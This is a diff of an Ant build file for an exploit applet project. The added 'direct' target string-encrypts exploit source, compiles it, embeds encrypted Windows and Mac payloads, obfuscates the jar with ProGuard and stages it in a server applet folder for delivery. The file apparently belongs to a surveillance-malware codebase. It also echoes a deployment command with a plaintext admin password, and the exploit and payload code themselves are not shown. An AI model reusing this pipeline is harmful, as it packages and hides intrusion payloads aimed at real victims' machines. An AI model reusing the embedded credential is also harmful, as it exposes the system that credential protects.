@@ -12,7 +12,9 @@
             failonerror="false" />
         <mkdir dir="build" />
         <mkdir dir="build/classes-exploit" />
+        <mkdir dir="build/classes-direct" />        
         <mkdir dir="build/jar" />
+
      </target>
           
     <target name="build_exploit" depends="init">
@@ -162,7 +164,7 @@
         </java>
         </target>
         
-         <target name="add_nopayload_win">
+        <target name="add_nopayload_win">
         <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
             <arg value="payloads/nowin" />
             <arg value="build/classes-exploit/w" />
@@ -201,9 +203,10 @@
         </target>
         
         <target name="dist" depends="build_exploit,obfuscate_exploit,add_nopayload_win,make_jar">
-          <copy overwrite="true" todir="server/applet" >
-            <fileset dir="build/jar" />
-          </copy>
+          <delete file="server/applet/w.jar"/>
+          <copy file ="build/jar/x.jar" overwrite="true" todir="server/applet" />
+           
+          
           <zip destfile="server/applet.zip" basedir="server/applet" />
           <copy file="server/applet.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\applet.zip" overwrite="true" />
           <echo>rcs-core -n applet -d zenotto -u admin -p adminp123 -R applet.zip -f1</echo>
@@ -225,7 +228,51 @@
             includes="**/*.class"
             jarfile="build/jar/payload.jar" /> -->
 
-
-
+		<taskdef resource="proguard/ant/task.properties"
+         	classpath="lib/proguard.jar" />
+		
+		<target name="direct">
+		    
+		    <mkdir dir="build/src-direct-encoded" />
+		    
+		    <java
+	            classname="x.StringEncryptor"
+	            classpath="build/classes-datacreator;build/classes-exploit"
+	            failOnError="true" >
+	
+	            <arg value="src-direct/WE.java" />
+	            <arg value="build/src-direct-encoded/WE.java" />
+        	</java>
+		    <copy todir="build/src-direct-encoded">
+		        <fileset dir="src-direct/x"/>
+		    </copy>
+		    
+		    <javac  debug="false"
+		            destdir="build/classes-direct"
+		            source="1.6"
+		            srcdir="build/src-direct-encoded"
+		            target="1.6" />
+		    
+		    <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            	<arg value="payloads/nowin" />
+            	<arg value="build/classes-direct/w" />
+            </java>
+            <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            	<arg value="payloads/nomac" />
+            	<arg value="build/classes-direct/m" />
+            </java>
+            
+		    <jar jarfile="build/jar/we.jar" >
+	            <fileset dir="build/classes-direct" includes="**/*" />          
+        	</jar>
+        	
+		    <proguard configuration="applets.pro"/>
+		    
+		    <delete file="server/applet/x.jar"/>
+		    <copy file="build/jar/w.jar" todir="server/applet"/>                
+            
+            <zip destfile="server/applet.zip" basedir="server/applet" />               
+            
+		</target>
 
 </project>
